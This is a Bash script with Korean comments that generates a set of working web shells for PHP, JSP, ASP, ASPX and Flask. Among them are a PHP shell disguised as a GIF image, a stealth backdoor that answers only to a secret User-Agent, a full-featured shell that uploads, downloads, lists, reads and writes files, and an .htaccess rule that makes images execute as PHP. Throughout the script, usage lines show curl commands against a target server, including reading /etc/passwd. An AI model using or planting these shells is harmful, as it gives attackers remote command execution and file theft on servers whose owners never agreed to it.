#!/bin/bash
#
# 웹쉘 생성 스크립트
# 다양한 웹쉘 파일을 생성
#
# 사용법: ./webshell_generator.sh
#

OUTPUT_DIR="webshells"
mkdir -p "$OUTPUT_DIR"

echo "============================================================"
echo "웹쉘 생성기"
echo "============================================================"
echo "출력 디렉토리: $OUTPUT_DIR"
echo ""

# 1. PHP 미니멀 쉘
cat > "$OUTPUT_DIR/shell_minimal.php" << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
echo "[+] $OUTPUT_DIR/shell_minimal.php"
echo "    사용: http://target.com/shell_minimal.php?cmd=whoami"
echo ""

# 2. PHP POST 방식
cat > "$OUTPUT_DIR/shell_post.php" << 'EOF'
<?php system($_POST['cmd']); ?>
EOF
echo "[+] $OUTPUT_DIR/shell_post.php"
echo "    사용: curl -d 'cmd=whoami' http://target.com/shell_post.php"
echo ""

# 3. PHP Eval 방식
cat > "$OUTPUT_DIR/shell_eval.php" << 'EOF'
<?php @eval($_POST['x']); ?>
EOF
echo "[+] $OUTPUT_DIR/shell_eval.php"
echo "    사용: curl -d \"x=system('whoami');\" http://target.com/shell_eval.php"
echo ""

# 4. PHP 이미지 위장
cat > "$OUTPUT_DIR/shell.gif" << 'EOF'
GIF89a
<?php system($_GET['c']); ?>
EOF
echo "[+] $OUTPUT_DIR/shell.gif"
echo "    사용: http://target.com/file.php?name=shell.gif&cmd=whoami"
echo ""

# 5. PHP 이미지 위장 (JPG)
cat > "$OUTPUT_DIR/shell.jpg" << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
echo "[+] $OUTPUT_DIR/shell.jpg"
echo "    사용: http://target.com/file.php?name=shell.jpg&cmd=whoami"
echo ""

# 6. PHP 완전 기능
cat > "$OUTPUT_DIR/shell_full.php" << 'EOF'
<?php
error_reporting(0);

// 명령 실행
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

// 파일 업로드
if(isset($_FILES['f'])){
    if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
        echo "Uploaded: " . $_FILES['f']['name'] . "<br>";
    } else {
        echo "Upload failed<br>";
    }
}

// 파일 다운로드
if(isset($_GET['dl'])){
    $file = $_GET['dl'];
    if(file_exists($file)){
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// 디렉토리 리스팅
if(isset($_GET['ls'])){
    $dir = $_GET['ls'];
    if(is_dir($dir)){
        $files = scandir($dir);
        echo "<pre>";
        foreach($files as $file){
            echo $file . "\n";
        }
        echo "</pre>";
    }
}

// 파일 읽기
if(isset($_GET['read'])){
    $file = $_GET['read'];
    if(file_exists($file)){
        echo "<pre>";
        echo htmlspecialchars(file_get_contents($file));
        echo "</pre>";
    }
}

// 파일 쓰기
if(isset($_POST['write']) && isset($_POST['content'])){
    file_put_contents($_POST['write'], $_POST['content']);
    echo "Written to: " . $_POST['write'] . "<br>";
}
?>
EOF
echo "[+] $OUTPUT_DIR/shell_full.php"
echo "    명령: http://target.com/shell_full.php?cmd=whoami"
echo "    업로드: curl -F 'f=@file.txt' http://target.com/shell_full.php"
echo "    다운로드: http://target.com/shell_full.php?dl=/etc/passwd"
echo "    디렉토리: http://target.com/shell_full.php?ls=/tmp"
echo ""

# 7. PHP 백도어 (은밀)
cat > "$OUTPUT_DIR/shell_stealth.php" << 'EOF'
<?php
// 특정 User-Agent에만 반응
if(isset($_SERVER['HTTP_USER_AGENT'])){
    if(strpos($_SERVER['HTTP_USER_AGENT'], 'MySecretUA') !== false) {
        if(isset($_GET['c'])){
            system($_GET['c']);
        }
    }
}
?>
EOF
echo "[+] $OUTPUT_DIR/shell_stealth.php"
echo "    사용: curl -A 'MySecretUA' 'http://target.com/shell_stealth.php?c=whoami'"
echo ""

# 8. JSP 웹쉘
cat > "$OUTPUT_DIR/shell.jsp" << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null){
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while((line = br.readLine()) != null){
            out.println(line);
        }
    }
%>
EOF
echo "[+] $OUTPUT_DIR/shell.jsp"
echo "    사용: http://target.com/shell.jsp?cmd=whoami"
echo ""

# 9. ASP 웹쉘
cat > "$OUTPUT_DIR/shell.asp" << 'EOF'
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
Response.Write(getCommandOutput(Request.QueryString("cmd")))
%>
EOF
echo "[+] $OUTPUT_DIR/shell.asp"
echo "    사용: http://target.com/shell.asp?cmd=whoami"
echo ""

# 10. Python Flask 웹쉘
cat > "$OUTPUT_DIR/shell_flask.py" << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        try:
            output = os.popen(cmd).read()
            return f"<pre>{output}</pre>"
        except:
            return "Error"
    return "Shell Ready"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF
chmod +x "$OUTPUT_DIR/shell_flask.py"
echo "[+] $OUTPUT_DIR/shell_flask.py"
echo "    실행: python3 shell_flask.py"
echo "    사용: http://target.com:5000/?cmd=whoami"
echo ""

# 11. ASPX 웹쉘
cat > "$OUTPUT_DIR/shell.aspx" << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    if(cmd != null){
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>");
        Response.Write(p.StandardOutput.ReadToEnd());
        Response.Write("</pre>");
    }
}
</script>
EOF
echo "[+] $OUTPUT_DIR/shell.aspx"
echo "    사용: http://target.com/shell.aspx?cmd=whoami"
echo ""

# 12. .htaccess (PHP 실행 우회)
cat > "$OUTPUT_DIR/.htaccess" << 'EOF'
AddType application/x-httpd-php .jpg .png .gif .txt
EOF
echo "[+] $OUTPUT_DIR/.htaccess"
echo "    업로드 후 이미지 파일도 PHP로 실행됨"
echo ""

echo "============================================================"
echo "생성 완료!"
echo "============================================================"
echo ""
echo "생성된 파일들:"
ls -lh "$OUTPUT_DIR"
echo ""
echo "웹쉘 사용 예시:"
echo "  1. 타겟 서버에 업로드"
echo "  2. 브라우저나 curl로 접근"
echo "  3. cmd 파라미터로 명령 실행"
echo ""
echo "curl 사용 예시:"
echo "  curl 'http://target.com/shell_minimal.php?cmd=id'"
echo "  curl -d 'cmd=uname -a' http://target.com/shell_post.php"
echo "  curl -A 'MySecretUA' 'http://target.com/shell_stealth.php?c=whoami'"
echo ""
